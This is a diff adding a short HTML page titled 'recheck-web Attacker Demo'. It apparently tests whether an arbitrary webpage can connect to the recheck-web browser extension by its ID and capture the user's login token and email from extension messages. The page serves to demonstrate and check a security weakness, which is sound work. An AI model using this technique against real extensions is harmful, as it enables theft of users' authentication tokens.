@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset=utf-8>
+<title>recheck-web Attacker Demo</title>
+<script>
+	function $(id) {
+		return document.getElementById(id);
+	}
+// Gives error, as chrome.runtime is not defined...
+// chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
+// 	if (request.message === 'recheck-web_login') {
+// 		$('token').innerHTML = request.token;
+// 		$('email').innerHTML = request.email;
+// 	}
+// });
+
+	window.onmessage = (event) => {
+		  // Waiting for that message.
+		  $('messages').appendChild(document.createTextNode("Event received: " + event));
+	};
+	// should not be possible without explicit permission,
+	// according to https://developer.chrome.com/extensions/messaging#external-webpage
+	window.chrome.runtime.connect('ifbcdobnjihilgldbjeomakdaejhplii').onMessage.addListener(
+	  function(request, sender, sendResponse) {
+		  $('messages').appendChild(document.createTextNode("Event received: " + request));
+			if (request.message === 'recheck-web_login') {
+				$('token').innerHTML = request.token;
+				$('email').innerHTML = request.email;
+			}
+	  }
+	);  
+</script>
+</head>
+<body>
+	<div id="login" class="progress">
+		Logged in as <b><span id="email"></span></b>: <br /> 
+		<span id="token"></span>
+	</div>
+	<div id="messages"></div>
+</body>
+</html>
